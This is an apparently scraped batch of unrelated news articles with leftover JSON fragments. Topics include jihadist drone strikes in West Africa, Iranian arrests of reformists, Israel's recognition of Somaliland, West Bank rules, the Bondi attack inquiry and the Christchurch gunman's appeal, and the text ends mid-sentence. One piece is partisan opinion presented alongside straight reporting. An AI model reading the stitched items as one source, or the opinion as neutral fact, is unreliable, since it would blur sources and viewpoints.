      "content": "Share Save Share Save NurPhoto via Getty Images Jihadist groups are increasingly carrying out drone strikes in West Africa, raising alarm that they are building the capacity to wage a &quot;war from the skies&quot;. A leading violence monitoring organisation, Acled, has recorded at least 69 drone strikes by an al-Qaeda affiliate in Burkina Faso and Mali since 2023, while two Islamic State (IS) affiliates have carried out around 20 - mostly in Nigeria, which has been battling numerous insurgent groups for almost 25 years. The latest drone attack took place in Nigeria&#x27;s north-eastern Borno state on 29 January, when jihadists carried out a two-pronged assault - with multiple armed drones and ground fighters - on a military base. The military said nine of its soldiers were killed in the attack by the Islamic State of West Africa Province (Iswap) - identified by Acled as the &quot;most prolific&quot; IS African affiliate in &quot;drone warfare&quot;. The jihadists tended to carry out strikes with &quot;commercially available, relatively inexpensive quadcopter [unmanned] drones&quot; that were &quot;rigged with explosives&quot;, while also using them for reconnaissance and surveillance missions in preparation for ground attacks, Acled senior Africa analyst Ladd Serwat told the BBC. Despite the fact that Nigeria&#x27;s government tightly controls the import of commercial and hobby drones and prohibits their use without official permission, the jihadists were able to obtain them through their smuggling networks across the region&#x27;s porous borders, said a Nigeria-based senior researcher at the Good Governance Africa think-tank, Malik Samuel. &quot;The growing use of armed and surveillance drones by violent extremist groups in the Sahel and Lake Chad region is deeply concerning, and it marks a significant shift,&quot; security analyst Audu Bulama Bukarti told the BBC. &quot;Drones lower the cost of conducting attacks, allow militants to gather intelligence with minimal risk and enable strikes on military targets that were previously harder to reach,&quot; he added. According to Serwat, Iswap has carried out 10 drone strikes since 2024 in north-eastern Nigeria as well as in northern Cameroon, southern Niger, and southern Chad - all countries affected by the insurgency in Nigeria. A similar number of drone attacks were carried out by another IS affiliate, the Islamic State of Sahel Province (ISSP), in West Africa, Acled data shows. In its latest attack, ISSP carried out an assault on the international airport in Niger&#x27;s capital, Niamey, and nearby military bases, also on 29 January, with the defence ministry saying that four military personnel were injured and 20 of the assailants were killed. Serwat said that while some reports claim ISSP used mortars and RPGs, others suggest that the militants carried out a drone strike. &quot;If a drone was used, this represents the first time ISSP used an explosive-laden drone in Niger,&quot; he added. The jihadist group that has used drones the most is the al-Qaeda-affiliated Jama&#x27;at Nusrat al-Islam wal-Muslimin (JNIM). Acled says it has carried 69 strikes in neighbours Mali and Burkina Faso, and one across the border in Togo. Al-Zallaqa JNIM is regarded as the most powerful jihadist group in West Africa &quot;JNIM&#x27;s drone programme has developed rapidly and spread across interconnected networks in Mali and Burkina,&quot; Acled&#x27;s senior West Africa analyst Héni Nsaibia said. Military Africa, an online defence industry source, reported that last February, JNIM had also used what are known as first-person view (FPV) drones - when the pilot has a live feed from the drone - to drop improvised explosive devices, made from plastic bottles, onto military positions in Burkina Faso&#x27;s Djibo town. &quot;This marked a significant escalation, as FPV drones - small, agile, and often used in Ukraine - allow precise targeting,&quot; Military Africa reported . Samuel said the jihadist groups were influenced and trained by foreign fighters to constantly adopt new methods - from making roadside bombs and suicide belts, they had now learned to turn &quot;off-the-shelf&quot; drones into weapons. Drone attacks could reduce casualties among jihadists, while achieving greater &quot;effectiveness&quot; in hitting targets, Samuel said. Acled analyst Nsaibia told the BBC that while the majority of JNIM&#x27;s drone attacks in Mali and Burkina Faso had targeted the military and allied militias, some had also hit civilians, including markets in communities perceived as being aligned with government forces. As for Iswap, it was known to have carried out only one drone attack that hit civilians - in June 2025, when two pastoralists were killed and one injured in northern Cameroon, Nsaibia said. In a report last year, a researcher at the South Africa-based Institute for Security Studies, Taiwo Adebayo, wrote that to combat the threat, West African armies needed to carry out &quot;preemptive strikes&quot; to destroy drone assembly and launch sites, and acquire more counter-drone technology , including jamming devices and air defence systems. Otherwise, he warned, the jihadists could enhance their drone warfare capabilities and carry out &quot;high-impact assaults&quot; that could worsen instability in West Africa.

The two Asian financial centres would be the best choice for international investors who previously held overweight positions in US markets but now sought to diversify their portfolios, Tan Su Shan, CEO of the largest lender in Southeast Asia, said in an interview last week. US interest rate cuts and ongoing geopolitical tensions have prompted international investors to eye faster-growing Asian markets . “Global capital flows are changing, and that is going to become increasingly important to Asia,” she said. “Singapore and Hong Kong, as financial hubs, will both be winners in capturing the capital flows.” Advertisement Tan said Hong Kong’s initial public offering (IPO) market remains buoyant , supported by multiple connect schemes with mainland China that enable cross-border trading in stocks, bonds, exchange-traded funds and other assets. “Singapore will also benefit because its regulators have done a lot of work to revitalise its stock market,” she said. She said she expected international investors to deploy capital across IPOs, private assets, precious metals and digital assets, with DBS – which uses Singapore and Hong Kong as its twin hubs – positioned to benefit. Interest rate cuts and geopolitical tensions are spurring international investors to eye faster-growing Asian markets, particularly Hong Kong and Singapore, according to DBS.

      "content": "Listen to this article | 5 minsinfoplay videoplay-arrow02:35Iran arrests four political figures over alleged disruption of ‘political &amp;amp; social order’ twitterwhatsappcopylinkIranian authorities have arrested four people on charges of attempting to “disrupt the country’s political and social order” and working “for the benefit” of Israel and the United States during the antigovernment protests last month. The arrests were made late on Sunday and early on Monday, and included prominent reformist politicians who have recently spoken critically about the theocratic establishment, according to Iranian media reports. Those arrested were identified as Azar Mansouri, head of Iran’s Reformists Front, Mohsen Aminzadeh, a former diplomat, and Ebrahim Asgharzadeh, a former parliamentarian. Hojjat Kermani, the lawyer representing the three arrested people, told the semiofficial ISNA news agency that Javad Emam, a spokesman of the Reformists Front, was also taken from his home by security forces. Iran’s judiciary claimed that the group was behind “organising and leading extensive activities aimed at disrupting the political and social situation” at a time when the country faced “military threats” from Israel and the US, according to the official Mizan news agency. The individuals had done their utmost “to justify the actions of the terrorist foot soldiers on the streets”, it said. Iran’s Reformist Front confirmed the arrests in a statement on X. It said Mansouri was arrested from the “door of her home under a judicial order” by the intelligence forces of Iran’s Islamic Revolutionary Guard Corps (IRGC). It added that the IRGC has also issued summons to other senior members, including its deputy chairman, Mohsen Armin, and secretary, Badralsadat Mofidi. Local media reported another reformist figure, Feizollah Arab Sorkhi, was also summoned. The arrests come amid anger in Iran over the deaths of thousands of Iranians during the January unrest. The protests began in the capital, Tehran, over a worsening economic crisis, but quickly escalated into a nationwide antigovernment movement. Iranian authorities labelled the protesters as “terrorists” and blamed the “riots” on foreign interference from Israel and the US. The government later said 3,117 people were killed during the unrest and rejected claims by the United Nations and international human rights organisations that state forces were behind the killings, most of which occurred on the nights of January 8 and 9. The US-based Human Rights Activists News Agency (HRANA) said it has verified 6,961 deaths and is investigating 11,730 other cases. The organisation reports that at least 51,591 people have been arrested during and after the nationwide protests. UN special rapporteur on Iran, Mai Sato, said more than 20,000 people may have been killed during the protests as information remains limited amid heavy internet filtering by the state. Reacting to the protest killings in a statement in late January, the Reformist Front had said it grieved “the great catastrophe” alongside the Iranian people, and called for sweeping reforms and the formation of an independent fact-finding mission. It had also threatened to dissolve in case the “destructive methods of the past” persist. Mir Hossein Mousavi, former leader of the Reformist Front, who has been under house arrest since the Green Movement of 2009, released his strongest statement to date last month, calling for a democratic transition away from the “Islamic Republic” and for holding a constitutional referendum. “How many ways must people say that they do not want this system and do not believe your lies? Enough. The game is over,” he wrote last month. At least four people, including a reformist figure and three activists, were arrested for helping draft and publish the statement. Al Jazeera’s Tohid Asadi, reporting from Tehran, said the politicians arrested on Sunday and Monday face “serious allegations”. He said Aminzadeh was a former deputy foreign minister during the presidency of Mohammad Khatami, who governed from 1997 to 2005, and that Asgharzadeh is a former lawmaker who was a student leader “involved in the takeover of the US embassy” in 1979. “These figures have a background of political activism and imprisonment,” Asadi said. “So this is not the first time that they are facing such allegations. And they are going through a trajectory that could pave the way for imprisonment for them,” he said. Analysts say the crackdown is a sign the Iranian government is trying to send a message to any other dissidents who challenge it. “These are the people who have been calling for more political liberalisation. Some of them have called for the end of the Islamic Republic,” said Sina Azodi, the director of the Middle East Studies programme at George Washington University in Washington, DC. “This tells me the Islamic Republic has decided to close any avenues for political dissent and, rather, to rule with an iron fist, through crackdowns and more fear-mongering among any political dissidents.” The Iranian clampdown has also ratcheted up tensions with Washington. When the protests first broke out, US President Donald Trump – who is seeking to curb Iran’s nuclear and missile programmes – threatened Tehran with new attacks if it used force against the protesters. Trump, who had ordered the US military strikes on three Iranian nuclear sites last June, also deployed a naval “armada” to the Gulf region. The move prompted Iranian Supreme Leader Ayatollah Ali Khamenei to warn of a “regional war” if Iran is attacked, as well as a push by regional powers to ease the tensions. The diplomacy resulted in Iran and the US holding indirect talks in Oman on Friday. President Masoud Pezeshkian described the discussions as “a step forward” in a social media post on Sunday and said his government favoured continued dialogue. Another round of negotiations is scheduled for next week. Phyllis Bennis, a fellow at the Institute for Policy Studies in Washington, DC, told Al Jazeera that she does not expect the latest arrests in Iran to affect the ongoing nuclear negotiations. “I am not sure that these arrests are going to be a specific focus of the talks as they continue,” she told Al Jazeera. However, she noted the arrests come amid the talks in Oman and a planned visit by Israeli Prime Minister Benjamin Netanyahu to the US capital. Netanyahu will probably demand Iran halt all uranium enrichment, end its missile programme, and stop supporting regional allies, Bennis said. “It’s essentially a call for Iranian surrender,” she said. “So there’ll be a big question as to whether the US is going to go along with the Israeli position or maintain its own position, which historically has been slightly different than Israel’s, particularly on the question of nuclear enrichment.”",

Overall platform use has declined, with the youngest and oldest Americans increasingly abstaining from social media altogether. Facebook, YouTube, and Twitter/X have lost ground, while TikTok and Reddit have grown modestly, reflecting a more fragmented digital public sphere. Platform audiences have aged and become slightly more educated and diverse. Politically, most platforms have moved toward Republican users while remaining, on balance, Democratic-leaning. Twitter/X has experienced the sharpest shift: posting has flipped nearly 50 percentage points from Democrats to Republicans. Across platforms, political posting remains tightly linked to affective polarization, as the most partisan users are also the most active. As casual users disengage and polarized partisans remain vocal, the online public sphere grows smaller, sharper, and more ideologically extreme.

      "content": "When Israel announced late last month that it would recognise Somaliland, leaders in Hargeisa framed the move as a diplomatic breakthrough. However, in the Horn of Africa and the wider international community, it was received very differently. It was seen as a warning sign that the Red Sea is becoming the next frontier of militarised fragmentation, where state weakness is exploited to secure strategic footholds with destabilising consequences for an already fragile region. As the first country to recognise Somaliland, Israel has raised deeper concerns that the move is less about diplomatic normalisation than strategic positioning along one of the world's most vital maritime corridors. The reaction by the Federal Government of Somalia was swift. It launched diplomatic countermeasures, public protests erupted in multiple cities, and regional organisations, including the African Union , the Intergovernmental Authority on Development ( Igad) , the Arab League and the Organisation of Islamic Cooperation ( OIC ), reaffirmed their support for Somalia's sovereignty and territorial integrity. Likewise, more than 30 countries condemned Israel's recognition and reaffirmed Somalia's sovereignty. New MEE newsletter: Jerusalem Dispatch Sign up to get the latest insights and analysis on Israel-Palestine, alongside Turkey Unpacked and other MEE newsletters Given Israel's broader historical record, this latest announcement is hardly surprising. Since its establishment in 1948, Israel has been widely recognised by human rights organisations and legal scholars as a settler-colonial state. Recurrent military campaigns against Palestinians have reinforced this perception over time, most recently through its genocidal war on Gaza , which has deepened Israel's diplomatic isolation amid intensified international outrage. History of alignment Israel's contested position in international politics has repeatedly led it to align with other isolated and outlier states and entities. A defining historical example was its close alliance with apartheid South Africa . Beginning in the 1970s, the two governments cemented a robust political, ideological and military partnership, forged by their shared status as international pariahs. South Africa's defence sector, in particular, became heavily dependent on Israeli expertise and technology, a reality later acknowledged by Alon Liel, a former Israeli ambassador to South Africa, who stated in 2021 that \"Israel created the South African arms industry\". Israel's alignment with anomalous and isolated entities is part of a deliberate strategy to fragment states it views as strategically hostile The alliance between Israel and apartheid South Africa rested on more than shared strategic interests. It reflected a deeper ideological affinity, in which state legitimacy in both cases was constructed through narratives that erased the claims and histories of indigenous populations. Just as Zionist rhetoric once described Palestine as \"a land without a people for a people without a land\", so too did Afrikaners construct narratives that denied or diminished the existence of Black populations already living on the land. This shared ideological framework helped cement their political and military partnership. Israel's alignment with anomalous and isolated entities is part of a deliberate strategy to fragment states it views as strategically hostile. One manifestation of this approach has been Israel's engagement with separatist movements across the Middle East to erode state cohesion. This has included outreach to Kurdish independence aspirations in northern Iraq , indirect ties with Kurdish factions in Turkey, and, more recently, providing humanitarian and reported tacit support to Kurdish-led administrations in north-eastern Syria , as well as to Druze communities in southern Syria. Fragmenting Somalia The recognition of Somaliland represents the latest manifestation of Israel's long-standing strategy of division and fragmentation. Israel seeks to exploit the grievances caused by state failure in Somalia. However, the situation in Somaliland is somewhat different. The administration faces deep internal contradictions, particularly along clan lines, with no consensus on secession. In early 2023, unionist clans rose up against the Somaliland administration in a violent conflict centred in Las Anod . The confrontation resulted in the collapse of Somaliland's authority in parts of Sool, Sanaag and Cayn, and the subsequent establishment of a new administration aligned with the Federal Government of Somalia. This entity, initially known as SSC-Khatumo, was formally recognised by Mogadishu as an interim administration and later evolved into the North Eastern State of Somalia, complete with its own parliament and executive leadership. Although Somaliland has persistently sought international recognition, no sovereign state has formally responded to this bid. The reluctance is rooted in fundamental principles of international law, particularly the norm of respect for the sovereignty and territorial integrity of existing states. Israel's presence in the Horn of Africa and the Red Sea is not new. What has changed, however, is the urgency driving its regional engagement due to the war on Gaza. Houthi attacks on Israeli-linked shipping have exposed vulnerabilities at this vital maritime chokepoint, inflicting significant economic losses and reinforcing the imperative to secure reliable footholds and influence along the Red Sea corridor . This also aligns with Netanyahu's repeated assertion that he intends to fundamentally \"restructure\" the Middle East. According to multiple Israeli news outlets and research institutions, in exchange for recognition, Israel will establish military and surveillance facilities along Somaliland's Red Sea coast to monitor and influence maritime traffic. While this would enable Israel to tackle the Houthis in any future confrontation with Iran, which is very likely, it would also effectively encircle Egypt, Saudi Arabia and other Gulf states, for whom the Red Sea serves as a critical strategic and economic backyard. Human and regional consequences Growing Red Sea fragility is marked by the imminent fragmentation of three critical states: Somalia, Yemen and Sudan . This broader instability threatens regional security. An Israeli presence in a fragmented Somalia would directly threaten Egypt, much like Sudan's division has done. While recent Saudi military intervention has, for now, arrested the total partition of Yemen , its division reshapes Red Sea dynamics, posing a serious national security challenge for Saudi Arabia and the wider region. Israel's regional strategy also contends with Turkey, a key competitor and principal strategic ally for Somalia. Their rivalry is evident in opposing approaches to Syria, where Israel favours division and Turkey supports the new government in Damascus, and in the Eastern Mediterranean, where an Israeli-Greek-Cypriot pact aims to marginalise Ankara. Months before Israel's recognition, reports had already surfaced suggesting that Somaliland might accept the resettlement of displaced Palestinians from Gaza Beyond the regional power rivalries this manoeuvre provokes, it has also fuelled far more disturbing speculation about the human consequences that could follow from such an alignment. The most alarming and widely circulated scenario concerns Somaliland's alleged willingness to participate in the ethnic cleansing of Palestinians. Months before Israel's recognition, reports had already surfaced suggesting that Somaliland might accept the resettlement of displaced Palestinians from Gaza. Recent developments have lent renewed weight to such claims, particularly as Israel has shown no indication of abandoning its project to forcibly displace Palestinians from their homeland. It is safe to assume that if Israel's strategy proceeds unimpeded, the region and its strategic extensions risk being engulfed in prolonged instability. Proxy wars among rival actors would likely intensify, providing fertile ground for extremist groups to expand and reversing years of security investments made by the international community. Somalia would risk becoming entangled in conflicts among competing regional and international powers, with its territory becoming a legitimate target for actors engaged in hostilities against Israel. In such a scenario, Israel would not deploy its advanced air defence systems, such as the Iron Dome, to protect Somalia. Consequently, Somalia's fragile and protracted state-building efforts would suffer severe setbacks, and Somaliland could be thrown into renewed upheaval, with a real risk of civil conflict.

      "content": "Listen to this article | 3 minsinfoIsraeli Finance Minister Bezalel Smotrich and a woman hold up a map that shows the long-frozen E1 settlement scheme, which would split occupied East Jerusalem from the occupied West Bank, near the illegal Israeli settlement of Maale Adumim, in the West Bank [File: Ronen Zvulun/Reuters]By Al Jazeera Staff and News Agencies8 Feb 2026share2Share twitterwhatsappcopylinkIsrael’s security cabinet has approved new rules aimed at strengthening Israeli control over the occupied West Bank, according to local media reports, drawing condemnation from Palestinian authorities. The Palestinian presidency, in a statement on Sunday, called the decision “dangerous” and an “open Israeli attempt to legalize settlement expansion” and land confiscation. President Mahmoud Abbas’s office called on the United States and the United Nations Security Council to intervene immediately. Reacting to the Israeli move, the Palestinian group Hamas called on people in the West Bank to “intensify the confrontation with the occupation and its settlers”. Meanwhile, Jordan’s Ministry of Foreign Affairs also condemned the decision, which it said was “aimed at imposing illegal Israeli sovereignty” and entrenching settlements. The rules will make it easier for Israeli settlers to buy land in the occupied West Bank and give Israeli officials stronger powers to enforce laws on Palestinians in the area, Israeli media reported. The West Bank is among the areas that Palestinians seek for a future independent state, along with Gaza and occupied East Jerusalem. Much of the West Bank is under direct Israeli military control, with extremely limited Palestinian self-rule in some areas, governed by the Western-backed Palestinian Authority (PA). According to the Israeli news outlets Ynet and Haaretz, the new steps include ending rules that prevented Jewish individuals from buying land in the occupied West Bank. The measures also include allowing Israeli authorities to take charge of managing some religious sites and increasing Israeli supervision and enforcement in areas run by the PA, according to the media reports. Al Jazeera’s Nida Ibrahim, reporting from Birzeit in the occupied West Bank, said the Israeli measures are “the most dangerous and serious push towards annexation and the most critical decision since Israel occupied the West Bank in 1967”. “It allows individual Israeli settlers to own land in areas that have historically been under Palestinian control, according to the signed agreement,” Ibrahim said. “There’s nothing that prevents settlers from owning land and coming to the city centre of Ramallah and building houses,” Ibrahim said, adding that owning land or building houses by settlers is illegal under the signed agreement with the Palestine Liberation Organization (PLO) and international laws that prohibit an occupying power from moving its citizens to occupied territory. Ibrahim said Palestinians are allowed to build houses only in Areas A and B, where they have been able to own land and build and expand. “There are a lot of restrictions on Palestinians owning land or building houses. Every time they build in Area C, Israel demolishes them,” she said. Area C in particular has a lot of settler presence. The office of far-right Israeli Finance Minister Bezalel Smotrich said in a statement, “We will continue to bury the idea of a Palestinian state.” “We are anchoring settlement as an inseparable part of Israel’s government policy,” said Israeli Defence Minister Israel Katz. Palestinian Vice President Hussein al-Sheikh said the reports about expected Israeli steps to increase annexation and create new facts on the ground in the occupied West Bank are a total violation of all signed and binding agreements, a serious escalation, and a violation of international law, the Palestinian news agency Wafa reported. He emphasised that these unilateral measures aim to eliminate any political prospects, obliterate the two-state solution, and drag the entire region into further tension and instability. The Al Jazeera correspondent said Israeli authorities can now demolish houses in Areas A and B, which have historically been under Palestinian control. “This decision puts the entire occupied West Bank in limbo and further consolidates Israel’s occupation and control of land. In the words of many Israeli leaders, it buries the dream of an independent Palestinian state,” she said. The reports come three days before Prime Minister Benjamin Netanyahu is scheduled to meet US President Donald Trump in Washington, DC.",

ABC’s Four Corners episode exploring the attack and the role of intelligence agencies has prompted an unusual intervention from Asio. Photograph: Sarah Wilson/EPA ABC to air Four Corners episode on Bondi terror attack despite preemptive criticism by Asio Intelligence agency takes unusual step of publicly releasing statement and says it will ‘reserve our right to take further action’ if the ABC makes false claims Follow our Australia news live blog for latest updates Get our breaking news email , free app or daily news podcast A Four Corners investigation into the secret lives of the alleged Bondi shooters in the lead-up to the nation’s worst terrorist attack will go to air on Monday night despite a preemptive claim by Asio that the episode contains “significant errors of fact”. Path to Terror examines whether there were failures in intelligence and counter-terrorism leading up to the antisemitic massacre on Bondi beach on 14 December, and tracks the paths to radicalisation of father and son Sajid and Naveed Akram. Asio took the unusual step on Sunday of releasing the statement it provided to the ABC in response to multiple questions the investigative program put to the intelligence agency ahead of broadcast. The ABC confirmed the agency had not seen the program but has made a series of assumptions based on the detailed questions put to them, including an allegation that the ABC used an unreliable source. Asio has also denied that it received intelligence about Sajid being part of a group that discussed a plan to establish a pro-Islamic State community in Türkiye and that Naveed was “a close associate” of known terrorists. “If the ABC chooses to publish claims it cannot substantiate – particularly ones it has been told are untrue – we will reserve our right to take further action,” the Asio statement said. When asked to clarify what action could be taken, a spokesperson for Asio referred Guardian Australia to its statement. Sign up: AU Breaking News email The ABC confirmed Asio’s intervention would not affect the planned 8.30pm broadcast and defended the program as a “comprehensive” seven-week investigation. “Four Corners spoke to numerous people and provides a number of sources of information for a detailed picture of the Akrams’ actions and associations in the years leading up to the Bondi attack,” an ABC spokesperson said. “Detailed questions were put to Asio and its response is reflected in the story. The public will be able to watch the full investigation tonight.” ABC staff told not to use disappearing messages on topics including antisemitism and extremism due to freeze notice | Weekly Beast Read more Reporter Sean Rubinsztein-Dunlop told the ABC in interviews on Monday the investigation has uncovered new information about the years leading up to the attack and asks whether Asio’s assessment of Naveed not being a threat was the “right call”. “Tonight, we present an astonishing inside account of the Akrams’ connections to an Islamic State network in Sydney dating back several years and revealing some of what authorities were told, and when Naveed Akram, as a 17-year-old, was associating with members of an Isis terror cell,” Rubensztein-Dunlop said . Asio assessed Naveed, then 17, in October 2019 for alleged associations with individuals involved in a reported Islamic State cell but concluded he was not an ongoing threat. In the immediate aftermath of the attack, the prime minister, Anthony Albanese, was the first to indicate something might have gone awry, saying that “quite clearly” there were issues. “We need to examine exactly the way that systems work,” Albanese said . “We need to look back at what happened in 2019 when this person was looked at, the assessment that was made,” he said. Path to Terror is the second of a two-part series on the Bondi massacre. Last week investigative journalist Mark Willacy presented a minute-by-minute account of how the tragedy unfolded at Bondi beach on the first day of Hanukah. ABC managing director Hugh Marks will appear before Senate estimates on Tuesday where the intervention of Asio ahead of an ABC program will almost certainly be raised.

      "content": "The Indian Coast Guard said that it seized three oil tankers&nbsp;in the Arabian Sea as part of what it described as a coordinated operation against an international oil-smuggling network, which the Iranian media has linked to the country's oil trade.&nbsp; In a statement , the Indian Coast Guard said it intercepted three vessels about 100 nautical miles west of Mumbai on Friday after what it called “tech-enabled surveillance and data-pattern analysis.” “The syndicate exploited mid-sea transfers in international waters to move cheap oil from conflict-ridden regions to motor tankers, evading duties owed to coastal states,” the coast guard said. It added that sustained inspections, electronic data checks and crew questioning had revealed the network’s methods and links to what it described as a “global handler network.” It said the vessels were being escorted to Mumbai for further legal action.

On Saturday, Washington announced new sanctions aimed at curbing Iran's oil exports, including targeting 14 vessels flagged in countries such as Turkey, India and the United Arab Emirates, moments after the indirect talks held in Oman concluded.&nbsp; On Thursday, Iran’s army spokesperson, Brigadier-General Mohammad Akraminia, said the military was ready for war, which would “encompass the entire region and all US bases” if that is what the US wanted.

Photograph: Dean Lewins/AAP Pro-Palestine group loses legal challenge against sweeping NSW police powers for Isaac Herzog’s visit Palestine Action Group argued powers so broad anyone in Sydney CBD or eastern suburbs could be searched – even when Israeli president in Canberra or Melbourne Follow our Australia news live blog for latest updates Get our breaking news email , free app or daily news podcast The Palestine Action Group has lost its legal challenge against sweeping powers handed to police by the Minns government for the duration of Israeli president Isaac Herzog’s visit. This means that police, under the state “major event” legislation – which is typically used for sporting events – may search anyone inside sections of the CBD and eastern suburbs until Thursday. Police will also have the power to move people on, close specific locations and issue orders to prevent disruption or risks to public safety. Anyone who fails to comply with directions may face penalties, including fines of up to $5,500. The group faced the state in the supreme court in Sydney on Monday before Justice Robertson Wright after launching an urgent challenge to the powers before a protest planned at Sydney’s town hall on Monday evening. The protesters may still be in breach of another anti-protest restriction passed after the Bondi terror attack by marching to state parliament on Monday evening. Known as the public assembly restriction declaration, it gives police the full suite of their move-on powers under the Summary Offences Act for offences such as obstructing traffic. Sign up: AU Breaking News email On Saturday, the Minns government had expanded police powers by declaring Herzog’s visit a major event , prompting the group to lodge a challenge against the decision on Sunday. Barrister Felicity Graham, who acted on behalf of the group alongside Peter Lange SC, had argued that the government had improperly used the legislation as a “backdoor way” to curtail protests. In court, the government rejected the suggestion that the powers were improperly invoked, arguing they were needed to secure the safety of the Israeli president and the community. Isaac Herzog meets survivors of Bondi terror attack, saying ‘when one Jew is hurt, all Jews feel their pain’ Read more Shortly before the judgment was handed down, Graham said a government briefing showed the police had listed itself as the “promoter” of Herzog’s visit and protesters were referred to as “spectators”. She said this further proved her argument that the act had been improperly used, arguing it was a “square peg being sought to shove into a round hole”. Graham, in arguing the government had improperly used the act, had pointed to comments the government made on Saturday when announcing the declaration that “we cannot allow a situation where mourners, visitors and protesters are brought into close proximity in a way that risks conflict, violence or public disorder”. She noted the sports minister, Steve Kamper, said confrontation between protesters and officials could make world news and affect the reputation of the state and Australia. “One might say the quiet part has been said out loud,” Graham said. “This is about stopping legitimate political expression in the public square against a controversial visiting head of state, from a country that is before the international court of justice on a charge of genocide.” View image in fullscreen (L-R) NSW premier, Chris Minns, with Israeli president, Isaac Herzog, and his wife, Michal Herzog, arrive for a wreath-laying ceremony at Bondi Pavilion. Photograph: Bianca de Marchi/AAP Wright questioned this. The judge suggested the motivation of the government was to keep opposing groups separated in the context of security risks after the Bondi terror attack, when 15 people were murdered during a Hanukah celebration. Graham countered: “In terms of where the president expects to be, it’s difficult to match that up then with the breadth of the major event declaration.” “Just as the act prohibits the declaration of a protest as a major event, we say the major event can’t be declared in such broad terms, lacking in such specificity, as to only describe a four-day period and a very large geographical area as a backdoor way of stopping protests during that time in the general location.” Lange argued that the extent of the powers was unreasonable in this instance. He said the declaration gave police the power to ask any person living in the eastern suburbs over the next four days to open their bag, container, or “any other thing” in their possession. Brendan Lim SC, on behalf of the government, argued that what constituted an “event” in the legislation was not defined – and therefore should be given a “broad meaning”. “It is the maintenance of security and safety of the president, dignitaries and the community generally, in light of the national terrorism threat and heightened community tensions, and the need to safely manage potential large crowds,” Lim told the court. “That is not a purpose of suppressing protest, it is a purpose of securing safety.” The government’s barrister said that police carving out Hyde Park from the declaration showed that suppressing protests was not the point – despite earlier arguments from Graham that this was a distraction. Wright was expected to make a decision on whether the government appropriately used its powers under the state’s major events legislation at about 4pm. The protest against the Israeli president was due to start at town hall at about 5.30pm. The group planned to march in a breach of another protest restriction: a public assembly restriction declaration, which was extended by police last Tuesday . The extension prevents the authorisation of protests under the form 1 system, effectively banning marches in designated areas without the risk of arrest. The current designated area includes the town hall and takes in the northern part of the CBD and the eastern suburbs but excludes Hyde Park. On Monday, a move on order was issued to a 24-year-old man outside Bondi Pavilion, where Herzog laid a wreath to the victims of the Bondi attack. The man was spoken to by officers on Campbell Parade after climbing on an electrical box and yelling at the passing motorcade of the president. “The man was issued a move on direction under the Major Events Act, which was complied with,” police said. Police said two additional people holding placards outside the event at Bondi Pavilion were issued move on directions under the Summary Offences act, which were complied with.

      "content": "Advertisement Bonds Business Hong Kong firms rush to issue convertibles – and trend could continue, bankers say Issuers raised US$7.4 billion in convertibles in early 2026, nearly half of last year’s total, as they rushed to lock in high share prices Reading Time: 3 minutes Why you can trust SCMP Cao Li Published: 10:30am, 9 Feb 2026 A growing number of Hong Kong-listed companies are tapping strong equity market sentiment to issue convertible bonds, a trend bankers expect to continue. Eleven companies raised US$7.4 billion through convertible bonds in the first five weeks of 2026, about 47 per cent of last year’s US$16 billion total, according to Dealogic. Tianqi Lithium, one of the world’s largest producers of lithium-ion battery materials, announced on Wednesday that it would raise about HK$5.9 billion (US$755 million) from a combination of share placement and a convertible bond. That came a day after leading Chinese broker Huatai Securities said it would raise HK$10 billion through a convertible bond. Earlier, Chinese sportswear group Xtep said it would issue HK$500 million in convertible bonds to institutional investors. Advertisement “The volume has been pretty crazy since the beginning of January,” said Olivia Li, who leads the Greater China equity-linked business at Citi. The number of companies rushing to issue convertible bonds was growing and bankers were busy with deals even as the Lunar New Year approached, market players said. Advertisement “The key reason is that the equity market has started pretty strong this year,” said Li. “So everyone is trying to take advantage of the current high share prices to raise money by issuing equity-linked instruments, such as convertible bonds.” Convertible bonds are securities that can be converted into shares at a predetermined price, typically set at a premium to the current share price. When share prices are high, issuers can fix a higher conversion price, and investors gain more confidence that the stock will rise enough to make conversion worthwhile.

Photograph: Sanka Vidanagama/AFP/Getty Images View image in fullscreen Police vehicles outside Al Noor Mosque in Christchurch in 2021. Photograph: Sanka Vidanagama/AFP/Getty Images Christchurch gunman seeks to appeal convictions and withdraw guilty plea Australian white supremacist tells NZ court he was suffering from ‘nervous exhaustion’ when he entered his guilty plea in March 2020 The Australian white supremacist who murdered 51 Muslim worshippers at two mosques in Christchurch in 2019, in the worst mass shooting in the New Zealand’s history, has asked a court to discard his guilty pleas, claiming harsh prison conditions had affected his mental health and compelled him to admit to the crimes. Brenton Tarrant pleaded guilty in March 2020 to 51 counts of murder, 40 counts of attempted murder and a terrorism charge, after initially saying he would defend the charges. In August 2020, Tarrant became the first person in New Zealand under current laws to be sentenced to life in prison without the chance of ever walking free. But in 2022 he filed an appeal at the court of appeal , for both his convictions and his sentence. The court will consider whether the appeal can proceed because it was filed outside the legislated time frame to do so. The 35-year-old gave evidence via video link on 9 February, as part of a week-long hearing in Wellington. In front of a panel of three judges, Tarrant said his mental health had deteriorated due to conditions in prison, where he was held in solitary confinement, with limited reading material or contact with other prisoners. He said he was suffering “nervous exhaustion” by the time he entered his guilty pleas, and he had admitted to the crimes just months before his trial was due to begin because he felt there was “little else I could do”. Crown lawyer Barnaby Hawes challenged Tarrant, suggesting there was little evidence he had been in serious mental crisis. Hawes said Tarrant had other options, including delaying his trial date on mental health grounds, or defending himself at trial. Tarrant, a self-declared white supremacist, said he had masked his mental illness, partly driven by the “political movement I’m a part of”. He said he had made a late application because he had not had access to the information required to make it. According to court documents, the court will be primarily considering the application to vacate the guilty pleas. “The central issue before the court will be whether at the time Mr Tarrant entered his guilty pleas he was incapable of making rational decisions as a result of the conditions of his imprisonment, which he says were torturous and inhumane,” it said. The judges are expected to release a decision at a later date. If the court grants the application to vacate the pleas, the case will be sent back to the high court for the terrorist to stand trial. If it declines the application then a further hearing will consider the sentence appeal later this year Security has been ramped up at the court, with only media, counsel and authorised people permitted to attend the hearing inside the courtroom. Limited space for the public has been made in an adjoining room, while provision has been made for victims and family members to view the hearing in Christchurch via a delayed broadcast. Tarrant’s legal counsel have been granted permanent name suppression. Aya Al-Umari, whose brother Hussein al-Umari was murdered at Masjid al-Noor, told The Post the hearing made her uncomfortable and listening to Tarrant give evidence for the first time would be difficult. “For the sake of my sanity … I have to think of them as just words with absolutely no meaning behind them,” she said. “But at the same time it is reopening a wound that you try so hard to close and try and move forward with life.” Tarrant moved to New Zealand in 2017 planning to carrying out a white supremacist attack. He planned the mass shooting for months, conducted reconnaissance at the mosques, distributed a manifesto expressing his racist views before he opened fire, and livestreamed part of the assault on Facebook. In the wake of the attacks, the 